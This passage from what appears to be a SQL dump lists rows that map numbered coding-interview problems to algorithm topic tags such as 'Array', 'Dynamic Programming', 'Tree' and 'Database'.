Programming',918),(2848,'Queue',918),(2849,'Monotonic Queue',918),(2850,'Tree',919),(2851,'Breadth-First Search',919),(2852,'Design',919),(2853,'Binary Tree',919),(2854,'Math',920),(2855,'Dynamic Programming',920),(2856,'Combinatorics',920),(2857,'String',921),(2858,'Stack',921),(2859,'Greedy',921),(2860,'Array',922),(2861,'Two Pointers',922),(2862,'Sorting',922),(2863,'Array',923),(2864,'Hash Table',923),(2865,'Two Pointers',923),(2866,'Sorting',923),(2867,'Counting',923),(2868,'Hash Table',924),(2869,'Depth-First Search',924),(2870,'Breadth-First Search',924),(2871,'Union Find',924),(2872,'Graph',924),(2873,'Two Pointers',925),(2874,'String',925),(2875,'String',926),(2876,'Dynamic Programming',926),(2877,'Array',927),(2878,'Math',927),(2879,'Hash Table',928),(2880,'Depth-First Search',928),(2881,'Breadth-First Search',928),(2882,'Union Find',928),(2883,'Graph',928),(2884,'Array',929),(2885,'Hash Table',929),(2886,'String',929),(2887,'Array',930),(2888,'Hash Table',930),(2889,'Sliding Window',930),(2890,'Prefix Sum',930),(2891,'Array',931),(2892,'Dynamic Programming',931),(2893,'Matrix',931),(2894,'Array',932),(2895,'Math',932),(2896,'Divide and Conquer',932),(2897,'Design',933),(2898,'Queue',933),(2899,'Data Stream',933),(2900,'Array',934),(2901,'Depth-First Search',934),(2902,'Breadth-First Search',934),(2903,'Matrix',934),(2904,'Dynamic Programming',935),(2905,'String',936),(2906,'Stack',936),(2907,'Greedy',936),(2908,'Queue',936),(2909,'Array',937),(2910,'String',937),(2911,'Sorting',937),(2912,'Tree',938),(2913,'Depth-First Search',938),(2914,'Binary Search Tree',938),(2915,'Binary Tree',938),(2916,'Array',939),(2917,'Hash Table',939),(2918,'Math',939),(2919,'Geometry',939),(2920,'Sorting',939),(2921,'String',940),(2922,'Dynamic Programming',940),(2923,'Array',941),(2924,'Array',942),(2925,'Two Pointers',942),(2926,'String',942),(2927,'Greedy',942),(2928,'Array',943),(2929,'String',943),(2930,'Dynamic Programming',943),(2931,'Bit Manipulation',943),(2932,'Bitmask',943),(2933,'Array',944),(2934,'String',944),(2935,'Array',945),(2936,'Greedy',945),(2937,'Sorting',945),(2938,'Counting',945),(2939,'Array',946),(2940,'Stack',946),(2941,'Simulation',946),(2942,'Hash Table',947),(2943,'Depth-First Search',947),(2944,'Union Find',947),(2945,'Graph',947),(2946,'Array',948),(2947,'Two Pointers',948),(2948,'Greedy',948),(2949,'Sorting',948),(2950,'Array',949),(2951,'String',949),(2952,'Enumeration',949),(2953,'Array',950),(2954,'Queue',950),(2955,'Sorting',950),(2956,'Simulation',950),(2957,'Tree',951),(2958,'Depth-First Search',951),(2959,'Binary Tree',951),(2960,'Array',952),(2961,'Hash Table',952),(2962,'Math',952),(2963,'Union Find',952),(2964,'Number Theory',952),(2965,'Array',953),(2966,'Hash Table',953),(2967,'String',953),(2968,'Array',954),(2969,'Hash Table',954),(2970,'Greedy',954),(2971,'Sorting',954),(2972,'Array',955),(2973,'String',955),(2974,'Greedy',955),(2975,'Array',956),(2976,'Dynamic Programming',956),(2977,'Array',957),(2978,'Hash Table',957),(2979,'Math',957),(2980,'Bit Manipulation',957),(2981,'Tree',958),(2982,'Breadth-First Search',958),(2983,'Binary Tree',958),(2984,'Array',959),(2985,'Hash Table',959),(2986,'Depth-First Search',959),(2987,'Breadth-First Search',959),(2988,'Union Find',959),(2989,'Matrix',959),(2990,'Array',960),(2991,'String',960),(2992,'Dynamic Programming',960),(2993,'Array',961),(2994,'Hash Table',961),(2995,'Array',962),(2996,'Stack',962),(2997,'Monotonic Stack',962),(2998,'Array',963),(2999,'Math',963),(3000,'Geometry',963),(3001,'Math',964),(3002,'Dynamic Programming',964),(3003,'Memoization',964),(3004,'Tree',965),(3005,'Depth-First Search',965),(3006,'Breadth-First Search',965),(3007,'Binary Tree',965),(3008,'Array',966),(3009,'Hash Table',966),(3010,'String',966),(3011,'Backtracking',967),(3012,'Breadth-First Search',967),(3013,'Dynamic Programming',968),(3014,'Tree',968),(3015,'Depth-First Search',968),(3016,'Binary Tree',968),(3017,'Array',969),(3018,'Two Pointers',969),(3019,'Greedy',969),(3020,'Sorting',969),(3021,'Hash Table',970),(3022,'Math',970),(3023,'Tree',971),(3024,'Depth-First Search',971),(3025,'Binary Tree',971),(3026,'Math',972),(3027,'String',972),(3028,'Array',973),(3029,'Math',973),(3030,'Divide and Conquer',973),(3031,'Geometry',973),(3032,'Sorting',973),(3033,'Heap (Priority Queue)',973),(3034,'Quickselect',973),(3035,'Array',974),(3036,'Hash Table',974),(3037,'Prefix Sum',974),(3038,'Array',975),(3039,'Dynamic Programming',975),(3040,'Stack',975),(3041,'Monotonic Stack',975),(3042,'Ordered Set',975),(3043,'Array',976),(3044,'Math',976),(3045,'Greedy',976),(3046,'Sorting',976),(3047,'Array',977),(3048,'Two Pointers',977),(3049,'Sorting',977),(3050,'Array',978),(3051,'Dynamic Programming',978),(3052,'Sliding Window',978),(3053,'Tree',979),(3054,'Depth-First Search',979),(3055,'Binary Tree',979),(3056,'Array',980),(3057,'Backtracking',980),(3058,'Bit Manipulation',980),(3059,'Matrix',980),(3060,'Hash Table',981),(3061,'String',981),(3062,'Binary Search',981),(3063,'Design',981),(3064,'Array',982),(3065,'Hash Table',982),(3066,'Bit Manipulation',982),(3067,'Array',983),(3068,'Dynamic Programming',983),(3069,'String',984),(3070,'Greedy',984),(3071,'Array',985),(3072,'Simulation',985),(3073,'Array',986),(3074,'Two Pointers',986),(3075,'Hash Table',987),(3076,'Tree',987),(3077,'Depth-First Search',987),(3078,'Breadth-First Search',987),(3079,'Binary Tree',987),(3080,'String',988),(3081,'Tree',988),(3082,'Depth-First Search',988),(3083,'Binary Tree',988),(3084,'Array',989),(3085,'Math',989),(3086,'Array',990),(3087,'String',990),(3088,'Union Find',990),(3089,'Graph',990),(3090,'Math',991),(3091,'Greedy',991),(3092,'Array',992),(3093,'Hash Table',992),(3094,'Sliding Window',992),(3095,'Counting',992),(3096,'Tree',993),(3097,'Depth-First Search',993),(3098,'Breadth-First Search',993),(3099,'Binary Tree',993),(3100,'Array',994),(3101,'Breadth-First Search',994),(3102,'Matrix',994),(3103,'Array',995),(3104,'Bit Manipulation',995),(3105,'Queue',995),(3106,'Sliding Window',995),(3107,'Prefix Sum',995),(3108,'Array',996),(3109,'Math',996),(3110,'Dynamic Programming',996),(3111,'Backtracking',996),(3112,'Bit Manipulation',996),(3113,'Bitmask',996),(3114,'Array',997),(3115,'Hash Table',997),(3116,'Graph',997),(3117,'Tree',998),(3118,'Binary Tree',998),(3119,'Array',999),(3120,'Matrix',999),(3121,'Simulation',999),(3122,'Array',1000),(3123,'Dynamic Programming',1000),(3124,'Prefix Sum',1000),(3125,'Array',1001),(3126,'Hash Table',1001),(3127,'Array',1002),(3128,'Hash Table',1002),(3129,'String',1002),(3130,'String',1003),(3131,'Stack',1003),(3132,'Array',1004),(3133,'Binary Search',1004),(3134,'Sliding Window',1004),(3135,'Prefix Sum',1004),(3136,'Array',1005),(3137,'Greedy',1005),(3138,'Sorting',1005),(3139,'Math',1006),(3140,'Stack',1006),(3141,'Simulation',1006),(3142,'Array',1007),(3143,'Greedy',1007),(3144,'Array',1008),(3145,'Stack',1008),(3146,'Tree',1008),(3147,'Binary Search Tree',1008),(3148,'Monotonic Stack',1008),(3149,'Binary Tree',1008),(3150,'Bit Manipulation',1009),(3151,'Array',1010),(3152,'Hash Table',1010),(3153,'Counting',1010),(3154,'Array',1011),(3155,'Binary Search',1011),(3156,'Math',1012),(3157,'Dynamic Programming',1012),(3158,'Array',1013),(3159,'Greedy',1013),(3160,'Array',1014),(3161,'Dynamic Programming',1014),(3162,'Hash Table',1015),(3163,'Math',1015),(3164,'String',1016),(3165,'Math',1017),(3166,'Array',1018),(3167,'Array',1019),(3168,'Linked List',1019),(3169,'Stack',1019),(3170,'Monotonic Stack',1019),(3171,'Array',1020),(3172,'Depth-First Search',1020),(3173,'Breadth-First Search',1020),(3174,'Union Find',1020),(3175,'Matrix',1020),(3176,'String',1021),(3177,'Stack',1021),(3178,'Tree',1022),(3179,'Depth-First Search',1022),(3180,'Binary Tree',1022),(3181,'Two Pointers',1023),(3182,'String',1023),(3183,'Trie',1023),(3184,'String Matching',1023),(3185,'Array',1024),(3186,'Dynamic Programming',1024),(3187,'Greedy',1024),(3188,'Math',1025),(3189,'Dynamic Programming',1025),(3190,'Brainteaser',1025),(3191,'Game Theory',1025),(3192,'Tree',1026),(3193,'Depth-First Search',1026),(3194,'Binary Tree',1026),(3195,'Array',1027),(3196,'Hash Table',1027),(3197,'Binary Search',1027),(3198,'Dynamic Programming',1027),(3199,'String',1028),(3200,'Tree',1028),(3201,'Depth-First Search',1028),(3202,'Binary Tree',1028),(3203,'Array',1029),(3204,'Greedy',1029),(3205,'Sorting',1029),(3206,'Array',1030),(3207,'Math',1030),(3208,'Geometry',1030),(3209,'Sorting',1030),(3210,'Matrix',1030),(3211,'Array',1031),(3212,'Dynamic Programming',1031),(3213,'Sliding Window',1031),(3214,'Array',1032),(3215,'String',1032),(3216,'Design',1032),(3217,'Trie',1032),(3218,'Data Stream',1032),(3219,'Math',1033),(3220,'Brainteaser',1033),(3221,'Array',1034),(3222,'Depth-First Search',1034),(3223,'Breadth-First Search',1034),(3224,'Matrix',1034),(3225,'Array',1035),(3226,'Dynamic Programming',1035),(3227,'Array',1036),(3228,'Hash Table',1036),(3229,'Depth-First Search',1036),(3230,'Breadth-First Search',1036),(3231,'Array',1037),(3232,'Math',1037),(3233,'Geometry',1037),(3234,'Tree',1038),(3235,'Depth-First Search',1038),(3236,'Binary Search Tree',1038),(3237,'Binary Tree',1038),(3238,'Array',1039),(3239,'Dynamic Programming',1039),(3240,'Array',1040),(3241,'Math',1040),(3242,'Two Pointers',1040),(3243,'Sorting',1040),(3244,'Math',1041),(3245,'String',1041),(3246,'Simulation',1041),(3247,'Depth-First Search',1042),(3248,'Breadth-First Search',1042),(3249,'Graph',1042),(3250,'Array',1043),(3251,'Dynamic Programming',1043),(3252,'String',1044),(3253,'Binary Search',1044),(3254,'Sliding Window',1044),(3255,'Rolling Hash',1044),(3256,'Suffix Array',1044),(3257,'Hash Function',1044),(3258,'Database',1045),(3259,'Array',1046),(3260,'Heap (Priority Queue)',1046),(3261,'String',1047),(3262,'Stack',1047),(3263,'Array',1048),(3264,'Hash Table',1048),(3265,'Two Pointers',1048),(3266,'String',1048),(3267,'Dynamic Programming',1048),(3268,'Array',1049),(3269,'Dynamic Programming',1049),(3270,'Database',1050),(3271,'Array',1051),(3272,'Sorting',1051),(3273,'Counting Sort',1051),(3274,'Array',1052),(3275,'Sliding Window',1052),(3276,'Array',1053),(3277,'Greedy',1053),(3278,'Array',1054),(3279,'Hash Table',1054),(3280,'Greedy',1054),(3281,'Sorting',1054),(3282,'Heap (Priority Queue)',1054),(3283,'Counting',1054),(3284,'Two Pointers',1055),(3285,'String',1055),(3286,'Greedy',1055),(3287,'Math',1056),(3288,'Array',1057),(3289,'Greedy',1057),(3290,'Sorting',1057),(3291,'Array',1058),(3292,'Math',1058),(3293,'String',1058),(3294,'Greedy',1058),(3295,'Depth-First Search',1059),(3296,'Graph',1059),(3297,'Array',1060),(3298,'Binary Search',1060),(3299,'String',1061),(3300,'Union Find',1061),(3301,'String',1062),(3302,'Binary Search',1062),(3303,'Dynamic Programming',1062),(3304,'Rolling Hash',1062),(3305,'Suffix Array',1062),(3306,'Hash Function',1062),(3307,'Array',1063),(3308,'Stack',1063),(3309,'Monotonic Stack',1063),(3310,'Array',1064),(3311,'Binary Search',1064),(3312,'Array',1065),(3313,'String',1065),(3314,'Trie',1065),(3315,'Sorting',1065),(3316,'Array',1066),(3317,'Dynamic Programming',1066),(3318,'Backtracking',1066),(3319,'Bit Manipulation',1066),(3320,'Bitmask',1066),(3321,'Math',1067),(3322,'Dynamic Programming',1067),(3323,'Database',1068),(3324,'Database',1069),(3325,'Database',1070),(3326,'Math',1071),(3327,'String',1071),(3328,'Array',1072),(3329,'Hash Table',1072),(3330,'Matrix',1072),(3331,'Array',1073),(3332,'Math',1073),(3333,'Array',1074),(3334,'Hash Table',1074),(3335,'Matrix',1074),(3336,'Prefix Sum',1074),(3337,'Database',1075),(3338,'Database',1076),(3339,'Database',1077),(3340,'String',1078),(3341,'Hash Table',1079),(3342,'String',1079),(3343,'Backtracking',1079),(3344,'Counting',1079),(3345,'Tree',1080),(3346,'Depth-First Search',1080),(3347,'Binary Tree',1080),(3348,'String',1081),(3349,'Stack',1081),(3350,'Greedy',1081),(3351,'Monotonic Stack',1081),(3352,'Database',1082),(3353,'Database',1083),(3354,'Database',1084),(3355,'Array',1085),(3356,'Math',1085),(3357,'Array',1086),(3358,'Hash Table',1086),(3359,'Sorting',1086),(3360,'Heap (Priority Queue)',1086),(3361,'String',1087),(3362,'Backtracking',1087),(3363,'Breadth-First Search',1087),(3364,'Math',1088),(3365,'Backtracking',1088),(3366,'Array',1089),(3367,'Two Pointers',1089),(3368,'Array',1090),(3369,'Hash Table',1090),(3370,'Greedy',1090),(3371,'Sorting',1090),(3372,'Counting',1090),(3373,'Array',1091),(3374,'Breadth-First Search',1091),(3375,'Matrix',1091),(3376,'String',1092),(3377,'Dynamic Programming',1092),(3378,'Array',1093),(3379,'Math',1093),(3380,'Probability and Statistics',1093),(3381,'Array',1094),(3382,'Sorting',1094),(3383,'Heap (Priority Queue)',1094),(3384,'Simulation',1094),(3385,'Prefix Sum',1094),(3386,'Array',1095),(3387,'Binary Search',1095),(3388,'Interactive',1095),(3389,'String',1096),(3390,'Backtracking',1096),(3391,'Stack',1096),(3392,'Breadth-First Search',1096),(3393,'Database',1097),(3394,'Database',1098),(3395,'Array',1099),(3396,'Two Pointers',1099),(3397,'Binary Search',1099),(3398,'Sorting',1099),(3399,'Hash Table',1100),(3400,'String',1100),(3401,'Sliding Window',1100),(3402,'Array',1101),(3403,'Union Find',1101),(3404,'Sorting',1101),(3405,'Array',1102),(3406,'Depth-First Search',1102),(3407,'Breadth-First Search',1102),(3408,'Union Find',1102),(3409,'Heap (Priority Queue)',1102),(3410,'Matrix',1102),(3411,'Math',1103),(3412,'Simulation',1103),(3413,'Math',1104),(3414,'Tree',1104),(3415,'Binary Tree',1104),(3416,'Array',1105),(3417,'Dynamic Programming',1105),(3418,'String',1106),(3419,'Stack',1106),(3420,'Recursion',1106),(3421,'Database',1107),(3422,'String',1108),(3423,'Array',1109),(3424,'Prefix Sum',1109),(3425,'Array',1110),(3426,'Hash Table',1110),(3427,'Tree',1110),(3428,'Depth-First Search',1110),(3429,'Binary Tree',1110),(3430,'String',1111),(3431,'Stack',1111),(3432,'Database',1112),(3433,'Database',1113),(3434,'Concurrency',1114),(3435,'Concurrency',1115),(3436,'Concurrency',1116),(3437,'Concurrency',1117),(3438,'Math',1118),(3439,'String',1119),(3440,'Tree',1120),(3441,'Depth-First Search',1120),(3442,'Binary Tree',1120),(3443,'Array',1121),(3444,'Counting',1121),(3445,'Array',1122),(3446,'Hash Table',1122),(3447,'Sorting',1122),(3448,'Counting Sort',1122),(3449,'Hash Table',1123),(3450,'Tree',1123),(3451,'Depth-First Search',1123),(3452,'Breadth-First Search',1123),(3453,'Binary Tree',1123),(3454,'Array',1124),(3455,'Hash Table',1124),(3456,'Stack',1124),(3457,'Monotonic Stack',1124),(3458,'Prefix Sum',1124),(3459,'Array',1125),(3460,'Dynamic Programming',1125),(3461,'Bit Manipulation',1125),(3462,'Bitmask',1125),(3463,'Database',1126),(3464,'Database',1127),(3465,'Array',1128),(3466,'Hash Table',1128),(3467,'Counting',1128),(3468,'Breadth-First Search',1129),(3469,'Graph',1129),(3470,'Array',1130),(3471,'Dynamic Programming',1130),(3472,'Stack',1130),(3473,'Greedy',1130),(3474,'Monotonic Stack',1130),(3475,'Array',1131),(3476,'Math',1131),(3477,'Database',1132),(3478,'Array',1133),(3479,'Hash Table',1133),(3480,'Sorting',1133),(3481,'Math',1134),(3482,'Union Find',1135),(3483,'Graph',1135),(3484,'Heap (Priority Queue)',1135),(3485,'Minimum Spanning Tree',1135),(3486,'Graph',1136),(3487,'Topological Sort',1136),(3488,'Math',1137),(3489,'Dynamic Programming',1137),(3490,'Memoization',1137),(3491,'Hash Table',1138),(3492,'String',1138),(3493,'Array',1139),(3494,'Dynamic Programming',1139),(3495,'Matrix',1139),(3496,'Array',1140),(3497,'Math',1140),(3498,'Dynamic Programming',1140),(3499,'Prefix Sum',1140),(3500,'Game Theory',1140),(3501,'Database',1141),(3502,'Database',1142),(3503,'String',1143),(3504,'Dynamic Programming',1143),(3505,'Array',1144),(3506,'Greedy',1144),(3507,'Tree',1145),(3508,'Depth-First Search',1145),(3509,'Binary Tree',1145),(3510,'Array',1146),(3511,'Hash Table',1146),(3512,'Binary Search',1146),(3513,'Design',1146),(3514,'Two Pointers',1147),(3515,'String',1147),(3516,'Dynamic Programming',1147),(3517,'Greedy',1147),(3518,'Rolling Hash',1147),(3519,'Hash Function',1147),(3520,'Database',1148),(3521,'Database',1149),(3522,'Array',1150),(3523,'Binary Search',1150),(3524,'Array',1151),(3525,'Sliding Window',1151),(3526,'Array',1152),(3527,'Hash Table',1152),(3528,'Sorting',1152),(3529,'Hash Table',1153),(3530,'String',1153),(3531,'Math',1154),(3532,'String',1154),(3533,'Dynamic Programming',1155),(3534,'Hash Table',1156),(3535,'String',1156),(3536,'Sliding Window',1156),(3537,'Array',1157),(3538,'Binary Search',1157),(3539,'Design',1157),(3540,'Binary Indexed Tree',1157),(3541,'Segment Tree',1157),(3542,'Database',1158),(3543,'Database',1159),(3544,'Array',1160),(3545,'Hash Table',1160),(3546,'String',1160),(3547,'Tree',1161),(3548,'Depth-First Search',1161),(3549,'Breadth-First Search',1161),(3550,'Binary Tree',1161),(3551,'Array',1162),(3552,'Dynamic Programming',1162),(3553,'Breadth-First Search',1162),(3554,'Matrix',1162),(3555,'Two Pointers',1163),(3556,'String',1163),(3557,'Database',1164),(3558,'Hash Table',1165),(3559,'String',1165),(3560,'Hash Table',1166),(3561,'String',1166),(3562,'Design',1166),(3563,'Trie',1166),(3564,'Array',1167),(3565,'Greedy',1167),(3566,'Heap (Priority Queue)',1167),(3567,'Union Find',1168),(3568,'Graph',1168),(3569,'Minimum Spanning Tree',1168),(3570,'Array',1169),(3571,'Hash Table',1169),(3572,'String',1169),(3573,'Sorting',1169),(3574,'Array',1170),(3575,'Hash Table',1170),(3576,'String',1170),(3577,'Binary Search',1170),(3578,'Sorting',1170),(3579,'Hash Table',1171),(3580,'Linked List',1171),(3581,'Hash Table',1172),(3582,'Stack',1172),(3583,'Design',1172),(3584,'Heap (Priority Queue)',1172),(3585,'Database',1173),(3586,'Database',1174),(3587,'Math',1175),(3588,'Array',1176),(3589,'Sliding Window',1176),(3590,'Array',1177),(3591,'Hash Table',1177),(3592,'String',1177),(3593,'Bit Manipulation',1177),(3594,'Prefix Sum',1177),(3595,'Array',1178),(3596,'Hash Table',1178),(3597,'String',1178),(3598,'Bit Manipulation',1178),(3599,'Trie',1178),(3600,'Database',1179),(3601,'Math',1180),(3602,'String',1180),(3603,'Array',1181),(3604,'Hash Table',1181),(3605,'String',1181),(3606,'Sorting',1181),(3607,'Array',1182),(3608,'Binary Search',1182),(3609,'Dynamic Programming',1182),(3610,'Greedy',1183),(3611,'Heap (Priority Queue)',1183),(3612,'Array',1184),(3613,'Math',1185),(3614,'Array',1186),(3615,'Dynamic Programming',1186),(3616,'Array',1187),(3617,'Binary Search',1187),(3618,'Dynamic Programming',1187),(3619,'Sorting',1187),(3620,'Concurrency',1188),(3621,'Hash Table',1189),(3622,'String',1189),(3623,'Counting',1189),(3624,'String',1190),(3625,'Stack',1190),(3626,'Array',1191),(3627,'Dynamic Programming',1191),(3628,'Depth-First Search',1192),(3629,'Graph',1192),(3630,'Biconnected Component',1192),(3631,'Database',1193),(3632,'Database',1194),(3633,'Concurrency',1195),(3634,'Array',1196),(3635,'Greedy',1196),(3636,'Sorting',1196),(3637,'Breadth-First Search',1197),(3638,'Array',1198),(3639,'Hash Table',1198),(3640,'Binary Search',1198),(3641,'Matrix',1198),(3642,'Counting',1198),(3643,'Math',1199),(3644,'Greedy',1199),(3645,'Heap (Priority Queue)',1199),(3646,'Array',1200),(3647,'Sorting',1200),(3648,'Math',1201),(3649,'Binary Search',1201),(3650,'Number Theory',1201),(3651,'Array',1202),(3652,'Hash Table',1202),(3653,'String',1202),(3654,'Depth-First Search',1202),(3655,'Breadth-First Search',1202),(3656,'Union Find',1202),(3657,'Sorting',1202),(3658,'Depth-First Search',1203),(3659,'Breadth-First Search',1203),(3660,'Graph',1203),(3661,'Topological Sort',1203),(3662,'Database',1204),(3663,'Database',1205),(3664,'Linked List',1206),(3665,'Design',1206),(3666,'Array',1207),(3667,'Hash Table',1207),(3668,'String',1208),(3669,'Binary Search',1208),(3670,'Sliding Window',1208),(3671,'Prefix Sum',1208),(3672,'String',1209),(3673,'Stack',1209),(3674,'Array',1210),(3675,'Breadth-First Search',1210),(3676,'Matrix',1210),(3677,'Database',1211),(3678,'Database',1212),(3679,'Array',1213),(3680,'Hash Table',1213),(3681,'Binary Search',1213),(3682,'Counting',1213),(3683,'Two Pointers',1214),(3684,'Binary Search',1214),(3685,'Stack',1214),(3686,'Tree',1214),(3687,'Depth-First Search',1214),(3688,'Binary Search Tree',1214),(3689,'Binary Tree',1214),(3690,'Backtracking',1215),(3691,'Breadth-First Search',1215),(3692,'String',1216),(3693,'Dynamic Programming',1216),(3694,'Array',1217),(3695,'Math',1217),(3696,'Greedy',1217),(3697,'Array',1218),(3698,'Hash Table',1218),(3699,'Dynamic Programming',1218),(3700,'Array',1219),(3701,'Backtracking',1219),(3702,'Matrix',1219),(3703,'Dynamic Programming',1220),(3704,'String',1221),(3705,'Greedy',1221),(3706,'Counting',1221),(3707,'Array',1222),(3708,'Matrix',1222),(3709,'Simulation',1222),(3710,'Array',1223),(3711,'Dynamic Programming',1223),(3712,'Array',1224),(3713,'Hash Table',1224),(3714,'Database',1225),(3715,'Concurrency',1226),(3716,'Math',1227),(3717,'Dynamic Programming',1227),(3718,'Brainteaser',1227),(3719,'Probability and Statistics',1227),(3720,'Array',1228),(3721,'Math',1228),(3722,'Array',1229),(3723,'Two Pointers',1229),(3724,'Sorting',1229),(3725,'Math',1230),(3726,'Dynamic Programming',1230),(3727,'Probability and Statistics',1230),(3728,'Array',1231),(3729,'Binary Search',1231),(3730,'Array',1232),(3731,'Math',1232),(3732,'Geometry',1232),(3733,'Array',1233),(3734,'String',1233),(3735,'Depth-First Search',1233),(3736,'Trie',1233),(3737,'String',1234),(3738,'Sliding Window',1234),(3739,'Array',1235),(3740,'Binary Search',1235),(3741,'Dynamic Programming',1235),(3742,'Sorting',1235),(3743,'String',1236),(3744,'Depth-First Search',1236),(3745,'Breadth-First Search',1236),(3746,'Interactive',1236),(3747,'Math',1237),(3748,'Two Pointers',1237),(3749,'Binary Search',1237),(3750,'Interactive',1237),(3751,'Math',1238),(3752,'Backtracking',1238),(3753,'Bit Manipulation',1238),(3754,'Array',1239),(3755,'String',1239),(3756,'Backtracking',1239),(3757,'Bit Manipulation',1239),(3758,'Backtracking',1240),(3759,'Database',1241),(3760,'Depth-First Search',1242),(3761,'Breadth-First Search',1242),(3762,'Concurrency',1242),(3763,'Array',1243),(3764,'Simulation',1243),(3765,'Hash Table',1244),(3766,'Design',1244),(3767,'Sorting',1244),(3768,'Tree',1245),(3769,'Depth-First Search',1245),(3770,'Breadth-First Search',1245),(3771,'Graph',1245),(3772,'Topological Sort',1245),(3773,'Array',1246),(3774,'Dynamic Programming',1246),(3775,'Math',1247),(3776,'String',1247),(3777,'Greedy',1247),(3778,'Array',1248),(3779,'Hash Table',1248),(3780,'Math',1248),(3781,'Sliding Window',1248),(3782,'String',1249),(3783,'Stack',1249),(3784,'Array',1250),(3785,'Math',1250),(3786,'Number Theory',1250),(3787,'Database',1251),(3788,'Array',1252),(3789,'Math',1252),(3790,'Simulation',1252),(3791,'Array',1253),(3792,'Greedy',1253),(3793,'Matrix',1253),(3794,'Array',1254),(3795,'Depth-First Search',1254),(3796,'Breadth-First Search',1254),(3797,'Union Find',1254),(3798,'Matrix',1254),(3799,'Array',1255),(3800,'String',1255),(3801,'Dynamic Programming',1255),(3802,'Backtracking',1255),(3803,'Bit Manipulation',1255),(3804,'Bitmask',1255),(3805,'Math',1256),(3806,'String',1256),(3807,'Bit Manipulation',1256),(3808,'Array',1257),(3809,'Hash Table',1257),(3810,'String',1257),(3811,'Tree',1257),(3812,'Depth-First Search',1257),(3813,'Breadth-First Search',1257),(3814,'Array',1258),(3815,'Hash Table',1258),(3816,'String',1258),(3817,'Backtracking',1258),(3818,'Union Find',1258),(3819,'Math',1259),(3820,'Dynamic Programming',1259),(3821,'Array',1260),(3822,'Matrix',1260),(3823,'Simulation',1260),(3824,'Hash Table',1261),(3825,'Tree',1261),(3826,'Depth-First Search',1261),(3827,'Breadth-First Search',1261),(3828,'Design',1261),(3829,'Binary Tree',1261),(3830,'Array',1262),(3831,'Dynamic Programming',1262),(3832,'Greedy',1262),(3833,'Sorting',1262),(3834,'Array',1263),(3835,'Breadth-First Search',1263),(3836,'Heap (Priority Queue)',1263),(3837,'Matrix',1263),(3838,'Database',1264),(3839,'Linked List',1265),(3840,'Two Pointers',1265),(3841,'Stack',1265),(3842,'Recursion',1265),(3843,'Array',1266),(3844,'Math',1266),(3845,'Geometry',1266),(3846,'Array',1267),(3847,'Depth-First Search',1267),(3848,'Breadth-First Search',1267),(3849,'Union Find',1267),(3850,'Matrix',1267),(3851,'Counting',1267),(3852,'Array',1268),(3853,'String',1268),(3854,'Binary Search',1268),(3855,'Trie',1268),(3856,'Sorting',1268),(3857,'Heap (Priority Queue)',1268),(3858,'Dynamic Programming',1269),(3859,'Database',1270),(3860,'Math',1271),(3861,'String',1271),(3862,'Array',1272),(3863,'Tree',1273),(3864,'Depth-First Search',1273),(3865,'Breadth-First Search',1273),(3866,'Array',1274),(3867,'Divide and Conquer',1274),(3868,'Interactive',1274),(3869,'Array',1275),(3870,'Hash Table',1275),(3871,'Matrix',1275),(3872,'Simulation',1275),(3873,'Math',1276),(3874,'Array',1277),(3875,'Dynamic Programming',1277),(3876,'Matrix',1277),(3877,'String',1278),(3878,'Dynamic Programming',1278),(3879,'Concurrency',1279),(3880,'Database',1280),(3881,'Math',1281),(3882,'Array',1282),(3883,'Hash Table',1282),(3884,'Array',1283),(3885,'Binary Search',1283),(3886,'Array',1284),(3887,'Hash Table',1284),(3888,'Bit Manipulation',1284),(3889,'Breadth-First Search',1284),(3890,'Matrix',1284),(3891,'Database',1285),(3892,'String',1286),(3893,'Backtracking',1286),(3894,'Design',1286),(3895,'Iterator',1286),(3896,'Array',1287),(3897,'Array',1288),(3898,'Sorting',1288),(3899,'Array',1289),(3900,'Dynamic Programming',1289),(3901,'Matrix',1289),(3902,'Linked List',1290),(3903,'Math',1290),(3904,'Enumeration',1291),(3905,'Array',1292),(3906,'Binary Search',1292),(3907,'Matrix',1292),(3908,'Prefix Sum',1292),(3909,'Array',1293),(3910,'Breadth-First Search',1293),(3911,'Matrix',1293),(3912,'Database',1294),(3913,'Array',1295),(3914,'Array',1296),(3915,'Hash Table',1296),(3916,'Greedy',1296),(3917,'Sorting',1296),(3918,'Hash Table',1297),(3919,'String',1297),(3920,'Sliding Window',1297),(3921,'Array',1298),(3922,'Breadth-First Search',1298),(3923,'Graph',1298),(3924,'Array',1299),(3925,'Array',1300),(3926,'Binary Search',1300),(3927,'Sorting',1300),(3928,'Array',1301),(3929,'Dynamic Programming',1301),(3930,'Matrix',1301),(3931,'Tree',1302),(3932,'Depth-First Search',1302),(3933,'Breadth-First Search',1302),(3934,'Binary Tree',1302),(3935,'Database',1303),(3936,'Array',1304),(3937,'Math',1304),(3938,'Tree',1305),(3939,'Depth-First Search',1305),(3940,'Binary Search Tree',1305),(3941,'Sorting',1305),(3942,'Binary Tree',1305),(3943,'Array',1306),(3944,'Depth-First Search',1306),(3945,'Breadth-First Search',1306),(3946,'Array',1307),(3947,'Math',1307),(3948,'String',1307),(3949,'Backtracking',1307),(3950,'Database',1308),(3951,'String',1309),(3952,'Array',1310),(3953,'Bit Manipulation',1310),(3954,'Prefix Sum',1310),(3955,'Array',1311),(3956,'Hash Table',1311),(3957,'Breadth-First Search',1311),(3958,'Graph',1311),(3959,'Sorting',1311),(3960,'String',1312),(3961,'Dynamic Programming',1312),(3962,'Array',1313),(3963,'Array',1314),(3964,'Matrix',1314),(3965,'Prefix Sum',1314),(3966,'Tree',1315),(3967,'Depth-First Search',1315),(3968,'Breadth-First Search',1315),(3969,'Binary Tree',1315),(3970,'String',1316),(3971,'Trie',1316),(3972,'Rolling Hash',1316),(3973,'Hash Function',1316),(3974,'Math',1317),(3975,'Bit Manipulation',1318),(3976,'Depth-First Search',1319),(3977,'Breadth-First Search',1319),(3978,'Union Find',1319),(3979,'Graph',1319),(3980,'String',1320),(3981,'Dynamic Programming',1320),(3982,'Database',1321),(3983,'Database',1322),(3984,'Math',1323),(3985,'Greedy',1323),(3986,'Array',1324),(3987,'String',1324),(3988,'Simulation',1324),(3989,'Tree',1325),(3990,'Depth-First Search',1325),(3991,'Binary Tree',1325),(3992,'Array',1326),(3993,'Dynamic Programming',1326),(3994,'Greedy',1326),(3995,'Database',1327),(3996,'String',1328),(3997,'Greedy',1328),(3998,'Array',1329),(3999,'Sorting',1329),(4000,'Matrix',1329),(4001,'Array',1330),(4002,'Math',1330),(4003,'Greedy',1330),(4004,'Array',1331),(4005,'Hash Table',1331),(4006,'Sorting',1331),(4007,'Two 